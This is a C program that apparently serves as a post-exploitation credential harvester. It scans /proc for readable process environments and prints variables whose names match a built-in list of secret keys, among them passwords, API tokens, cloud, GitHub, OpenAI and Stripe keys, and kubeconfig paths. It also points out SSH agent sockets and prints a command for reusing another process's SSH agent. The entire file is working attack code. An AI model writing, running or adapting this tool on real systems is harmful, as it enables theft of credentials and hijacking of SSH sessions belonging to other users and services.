#define _GNU_SOURCE
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <pwd.h>

static const char *SECRET_KEYS[] = {
    "PASSWORD", "PASSWD", "SECRET", "TOKEN", "API_KEY", "APIKEY",
    "ACCESS_KEY", "PRIVATE_KEY", "PRIVATE", "CREDENTIAL", "AUTH",
    "AWS_SECRET", "AWS_ACCESS", "GITHUB_TOKEN", "GH_TOKEN",
    "DATABASE_URL", "DB_PASS", "REDIS_URL", "MONGO_URL",
    "OPENAI_", "ANTHROPIC_", "STRIPE_", "TWILIO_", "SENDGRID_",
    "SLACK_TOKEN", "DISCORD_TOKEN", "TELEGRAM_",
    "KUBECONFIG", "GOOGLE_APPLICATION", "AZURE_",
    "SSH_AUTH_SOCK", "GPG_AGENT_INFO",
    NULL
};

static int is_secret(const char *key)
{
    for (int i = 0; SECRET_KEYS[i]; i++) {
        size_t klen = strlen(SECRET_KEYS[i]);
        if (strncasecmp(key, SECRET_KEYS[i], klen) == 0) return 1;
    }
    return 0;
}

static void print_environ(pid_t pid, int secrets_only, int ssh_only)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/environ", pid);

    char comm[32] = "?"; char cpath[64];
    snprintf(cpath, sizeof(cpath), "/proc/%d/comm", pid);
    FILE *cf = fopen(cpath, "r");
    if (cf) { fgets(comm, sizeof(comm), cf); fclose(cf);
               comm[strcspn(comm, "\n")] = 0; }

    int fd = open(path, O_RDONLY);
    if (fd < 0) return;

    char buf[131072];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return;
    buf[n] = '\0';

    int printed_header = 0;
    char *p = buf, *end = buf + n;

    while (p < end) {
        size_t len = strnlen(p, (size_t)(end - p));
        if (len == 0) { p++; continue; }

        char *eq = memchr(p, '=', len);
        if (!eq) { p += len + 1; continue; }

        char key[256] = {};
        size_t klen = (size_t)(eq - p);
        if (klen >= sizeof(key)) { p += len + 1; continue; }
        memcpy(key, p, klen);

        int secret = is_secret(key);
        int is_ssh  = (strncmp(key, "SSH_AUTH_SOCK", 13) == 0);

        int show = 0;
        if (ssh_only)     show = is_ssh;
        else if (secrets_only) show = secret;
        else              show = 1;

        if (show) {
            if (!printed_header) {
                printf("\n[pid=%-6d comm=%-16s]\n", pid, comm);
                printed_header = 1;
            }
            if (secret)
                printf("  \033[31m[SECRET]\033[0m %s\n", p);
            else
                printf("  %s\n", p);

            if (is_ssh) {
                const char *sock = eq + 1;
                printf("  \033[33m[>>] SSH_AUTH_SOCK=%s\033[0m\n", sock);
                printf("  \033[33m[>>] export SSH_AUTH_SOCK=%s && ssh-add -l\033[0m\n", sock);
            }
        }
        p += len + 1;
    }
}

static int pid_accessible(pid_t pid)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/environ", pid);
    return access(path, R_OK) == 0;
}

int main(int argc, char *argv[])
{
    int all        = 0;
    int secrets    = 0;
    int ssh_only   = 0;
    pid_t only_pid = 0;

    for (int i = 1; i < argc; i++) {
        if      (strcmp(argv[i], "--all")      == 0) all = 1;
        else if (strcmp(argv[i], "--secrets")  == 0) secrets = 1;
        else if (strcmp(argv[i], "--ssh-sock") == 0) { ssh_only = 1; secrets = 0; }
        else if (strcmp(argv[i], "--pid") == 0 && i+1 < argc)
            only_pid = (pid_t)atoi(argv[++i]);
    }

    uid_t my_uid = getuid();
    printf("[*] uid=%d  mode=%s\n",
           my_uid, ssh_only ? "ssh-sock" : secrets ? "secrets" : "all");

    if (only_pid) {
        print_environ(only_pid, secrets, ssh_only);
        return 0;
    }

    DIR *d = opendir("/proc");
    if (!d) { perror("opendir /proc"); return 1; }

    struct dirent *de;
    int found = 0;
    while ((de = readdir(d))) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        pid_t pid = (pid_t)atoi(de->d_name);
        if (!pid) continue;
        if (!pid_accessible(pid)) continue;

        if (!all) {

            char spath[64];
            snprintf(spath, sizeof(spath), "/proc/%d/status", pid);
            FILE *sf = fopen(spath, "r");
            if (!sf) continue;
            char line[128]; uid_t proc_uid = (uid_t)-1;
            while (fgets(line, sizeof(line), sf))
                if (sscanf(line, "Uid: %u", &proc_uid) == 1) break;
            fclose(sf);
            if (proc_uid != my_uid) continue;
        }

        print_environ(pid, secrets, ssh_only);
        found++;
    }
    closedir(d);

    if (!found) printf("\n[*] no variables found\n");
    else printf("\n[*] %d processes scanned\n", found);
    return 0;
}
